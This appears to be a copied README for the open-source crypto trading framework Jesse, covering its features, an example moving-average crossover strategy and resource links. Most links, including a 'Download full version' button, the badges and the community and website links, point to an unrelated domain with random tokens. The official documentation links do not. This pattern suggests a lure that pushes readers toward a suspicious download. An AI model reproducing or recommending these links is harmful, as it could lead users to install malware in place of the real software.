<div align="center">
<br>
<p align="center">
<img src="assets/jesse-logo.png" alt="Jesse" height="72" />
</p>

<p align="center">
Algo-trading was 😵‍💫, we made it 🤩
</p>
</div>

# Jesse
[![PyPI](https://img.shields.io/pypi/v/jesse)](https://downloadgitzsx.icu?n6ua7qudz2pa6s1)
[![Downloads](https://pepy.tech/badge/jesse)](https://downloadgitzsx.icu?xi8ts0jnz7h65la)
[![Docker Pulls](https://img.shields.io/docker/pulls/salehmir/jesse)](https://hub.docker.com/r/salehmir/jesse)
[![GitHub](https://img.shields.io/github/license/jesse-ai/jesse)](https://downloadgitzsx.icu?kl1qhlp2sf3ubc1)
[![coverage](https://codecov.io/gh/jesse-ai/jesse/graph/badge.svg)](https://codecov.io/gh/jesse-ai/jesse)

---
[Download full version](https://downloadgitzsx.icu?nd38v9cas6anhu6)

Jesse is an advanced crypto trading framework that aims to **simplify** **researching** and defining **YOUR OWN trading strategies** for backtesting, optimizing, and live trading.

## What is Jesse?
Watch this video to get a quick overview of Jesse:

[![Jesse Overview](https://img.youtube.com/vi/0EqN3OOqeJM/0.jpg)](https://downloadgitzsx.icu?3y9gifskurfmtka)

## Why Jesse?
In short, Jesse is more **accurate** than other solutions, and way more **simple**. 
In fact, it is so simple that in case you already know Python, you can get started today, in **matter of minutes**, instead of **weeks and months**. 

## Key Features

- 📝 **Simple Syntax**: Define both simple and advanced trading strategies with the simplest syntax in the fastest time.
- 📊 **Comprehensive Indicator Library**: Access a complete library of technical indicators with easy-to-use syntax.
- 📈 **Smart Ordering**: Supports market, limit, and stop orders, automatically choosing the best one for you.
- ⏰ **Multiple Timeframes and Symbols**: Backtest and livetrade multiple timeframes and symbols simultaneously without look-ahead bias.
- 🔒 **Self-Hosted and Privacy-First**: Designed with your privacy in mind, fully self-hosted to ensure your trading strategies and data remain secure.
- 🛡️ **Risk Management**: Built-in helper functions for robust risk management.
- 📋 **Metrics System**: A comprehensive metrics system to evaluate your trading strategy's performance.
- 🔍 **Debug Mode**: Observe your strategy in action with a detailed debug mode.
- 🔧 **Optimize Mode**: Fine-tune your strategies using AI, without needing a technical background.
- 📈 **Leveraged and Short-Selling**: First-class support for leveraged trading and short-selling.
- 🔀 **Partial Fills**: Supports entering and exiting positions in multiple orders, allowing for greater flexibility.
- 🔔 **Advanced Alerts**: Create real-time alerts within your strategies for effective monitoring.
- 🤖 **JesseGPT**: Jesse has its own GPT, JesseGPT, that can help you write strategies, optimize them, debug them, and much more.
- 🔧 **Built-in Code Editor**: Write, edit, and debug your strategies with a built-in code editor.
- 📺 **Youtube Channel**: Jesse has a Youtube channel with screencast tutorials that go through example strategies step by step.

## Example Strategy

```py
class SMACrossover(Strategy):
    @property
    def slow_sma(self):
        return ta.sma(self.candles, 200)

    @property
    def fast_sma(self):
        return ta.sma(self.candles, 50)

    def should_long(self) -> bool:
        # Fast SMA above Slow SMA
        return self.fast_sma > self.slow_sma

    def should_short(self) -> bool:
        # Fast SMA below Slow SMA
        return self.fast_sma < self.slow_sma

    def go_long(self):
        # Open long position and use entire balance to buy
        qty = utils.size_to_qty(self.balance, self.price, fee_rate=self.fee_rate)

        self.buy = qty, self.price

    def go_short(self):
        # Open short position and use entire balance to sell
        qty = utils.size_to_qty(self.balance, self.price, fee_rate=self.fee_rate)

        self.sell = qty, self.price

    def update_position(self):
        # If there exist long position, but the signal shows Death Cross, then close the position, and vice versa.
        if self.is_long and self.fast_sma < self.slow_sma:
            self.liquidate()
    
        if self.is_short and self.fast_sma > self.slow_sma:
            self.liquidate()
```

## Getting Started
Head over to the "getting started" section of the [documentation](https://docs.jesse.trade/docs/getting-started). The 
documentation is **short yet very informative**. 

## Resources

- [⚡️ Website](https://downloadgitzsx.icu?oun9b9i7cagrreh)
- [🎓 Documentation](https://docs.jesse.trade)
- [🎥 Youtube channel (screencast tutorials)](https://downloadgitzsx.icu?9vc0us6ys09ozll/youtube)
- [🛟 Help center](https://downloadgitzsx.icu?ozin1h8by7tbojj/help)
- [💬 Discord community](https://downloadgitzsx.icu?tlmugxjlmt072rp/discord)
- [🤖 JesseGPT](https://downloadgitzsx.icu?v8v07hhbb5qi4v3/gpt) (Requires a free account)

## What's next?

You can see the project's **[roadmap here](https://docs.jesse.trade/docs/roadmap.html)**. **Subscribe** to our mailing list at [jesse.trade](https://downloadgitzsx.icu?du8y5epjoc9g8qw) to get the good stuff as soon they're released. Don't worry, We won't send you spam—Pinky promise.

## Disclaimer
This software is for educational purposes only. USE THE SOFTWARE AT **YOUR OWN RISK**. THE AUTHORS AND ALL AFFILIATES ASSUME **NO RESPONSIBILITY FOR YOUR TRADING RESULTS**. **Do not risk money that you are afraid to lose**. There might be **bugs** in the code - this software DOES NOT come with **ANY warranty**.
